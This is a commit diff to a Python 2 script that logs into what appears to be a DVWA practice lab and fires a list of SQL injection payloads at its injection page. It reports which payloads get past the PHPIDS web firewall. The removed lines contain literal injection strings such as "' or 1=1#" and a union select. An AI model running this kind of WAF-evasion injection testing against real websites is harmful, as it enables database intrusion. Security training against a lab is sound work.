1269de9881667d4b9b0bd20b2be322850497b583
babylonQ <mirzad@gmail.com>
2016-07-14 12:12:50 +0200

    Reading from file

--- script.py
+++ script.py
@@ -3,8 +3,10 @@ import urllib, urllib2, cookielib
 username = 'admin'
 password = 'password'
 
-payload = urllib.quote_plus("' or 1=1#")
-payload2= urllib.quote_plus("1' and 1=1 union select 1,2#")
+#read all payload and sort them line by line without \n
+with open("/root/Desktop/payloads") as f:
+	payloads = f.read().splitlines()
+
 sufix = "&Submit=Submit#"
 
 menu = {}
@@ -17,15 +19,32 @@ while True:
   for entry in options:
 	print entry, menu[entry]
 
+  #Menu options
   selection = raw_input("Please select:")
   if selection == '1':
 	cj = cookielib.CookieJar()
 	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
-	login_data = urllib.urlencode({'username' : username, 'password' : password})
-	opener.open('http://192.168.57.100/index.php', login_data)
-	resp = opener.open('http://192.168.57.100/vulnerabilities/sqli/?id='+payload2+sufix)
-	print resp.read()
-	break
+	opener2 = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+
+#        login_data = urllib.urlencode({'username' : username, 'password' : password})
+        opener.open('http://192.168.57.100/index.php')
+	opener2.open('http://192.168.57.100/security.php?phpids=on')
+	# Test each payload from the file
+	count = 0
+	for payload in payloads:
+		count += 1
+		resp = opener.open('http://192.168.57.100/vulnerabilities/sqli/?id='+urllib.quote_plus(payload)+sufix) 
+		print "Payload " + str(count) + ": " + payload + " passed to the web app"
+		response = resp.read()
+		# Check if WAF has been triggered
+		if "Hacking" in response:
+			print "Payload " + str(count) + ": " + payload + " did not go through"
+			print "-----------------------------------"
+		else: 
+			print "Payload " + str(count) + ": " + payload + " succesfull"
+		      	print "-----------------------------------"
+#		print response
+#	break
   elif selection == '2':
 	print "XSS script now needs to run"
   elif selection == '3':
